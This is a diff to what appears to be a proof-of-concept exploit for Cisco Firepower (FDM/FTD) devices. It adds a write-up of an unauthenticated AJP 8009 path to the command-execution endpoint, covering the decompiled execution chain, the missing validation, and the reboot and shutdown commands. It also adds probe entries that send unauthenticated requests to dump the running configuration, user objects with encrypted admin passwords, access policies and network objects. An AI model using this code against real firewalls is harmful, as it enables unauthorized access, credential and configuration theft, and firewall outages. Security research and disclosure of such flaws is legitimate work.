@@ -24,10 +24,29 @@ Attack surface (local process, no credentials required):
 Critical endpoints accessible without authentication via AJP 8009:
   POST /api/fdm/v6/action/command
     Body: {"commandInput": "<CLISH command>", "timeOut": 30}
-    Executes arbitrary Cisco CLISH commands and returns output.
     Command model: com.cisco.ngfw.onbox.models.Command
       Fields: commandInput (String), commandOutput (String), timeOut (long)
-    This is the FDM web UI's underlying CLI proxy — full CLISH access.
+
+    Execution chain (CommandRepository.createEntity() — decompiled):
+      Special commands (specialCommandMap — hardcoded in class static initializer):
+        "reboot"   → perl -MFlyLoader -e "SF::System::Privileged::RebootSystem();"
+        "shutdown" → perl -MFlyLoader -e "SF::System::Privileged::ShutdownSystem();"
+      All other commands (getcliShCommandResponse()):
+        Primary path: perl -MFlyLoader -e "SF::CLI::converged_cli_util::converged_cmd('<cmd>')"
+        Fallback (if Perl returns "ERROR"):
+          clish -c "<commandInput>"   ← direct CLISH execution via ProcessBuilder
+
+      No command validation in Java layer:
+        clishSkipCommands.txt — loaded to cache "cli-skip-command" but NEVER checked
+          in createEntity() before exec. Skip list is timeout/autocomplete data only.
+        Any command not in specialCommandMap goes directly to clish -c or Perl CLI.
+
+    Impact: full FTD CLISH read access + device reboot/shutdown without authentication
+      show running-config → full firewall policy, VPN config, auth config
+      show crypto key mypubkey rsa → RSA public keys
+      show vpn-sessiondb → active VPN sessions
+      reboot → device reboot (firewall outage)
+      shutdown → device shutdown (firewall outage)
 
   GET /api/fdm/v6/identity/users
     Returns all FDM user objects including encrypted admin passwords.
@@ -354,8 +373,15 @@ def probe_device_info(host: str, ajp_port: int) -> dict:
 PROBES = [
     ('GET /api/versions (unauthenticated by design)', 'GET', '/api/versions', None, None),
     ('GET /api/fdm/v6/devices/default (device info)', 'GET', '/api/fdm/v6/devices/default', None, None),
-    ('GET /api/fdm/v6/identity/users (user list)', 'GET', '/api/fdm/v6/identity/users', None, None),
-    ('GET /api/fdm/v6/policy/accesspolicies (ACL)', 'GET', '/api/fdm/v6/policy/accesspolicies', None, None),
+    ('GET /api/fdm/v6/identity/users (user list + encrypted passwords)', 'GET', '/api/fdm/v6/identity/users', None, None),
+    ('GET /api/fdm/v6/policy/accesspolicies (ACL read)', 'GET', '/api/fdm/v6/policy/accesspolicies', None, None),
+    ('GET /api/fdm/v6/object/networks (network objects)', 'GET', '/api/fdm/v6/object/networks', None, None),
+    ('POST /action/command show version (CLISH exec)', 'POST', '/api/fdm/v6/action/command',
+     {'Content-Type': 'application/json'},
+     json.dumps({'commandInput': 'show version', 'timeOut': 30, 'type': 'Command'}).encode()),
+    ('POST /action/command show running-config (full config)', 'POST', '/api/fdm/v6/action/command',
+     {'Content-Type': 'application/json'},
+     json.dumps({'commandInput': 'show running-config', 'timeOut': 60, 'type': 'Command'}).encode()),
 ]
 
 
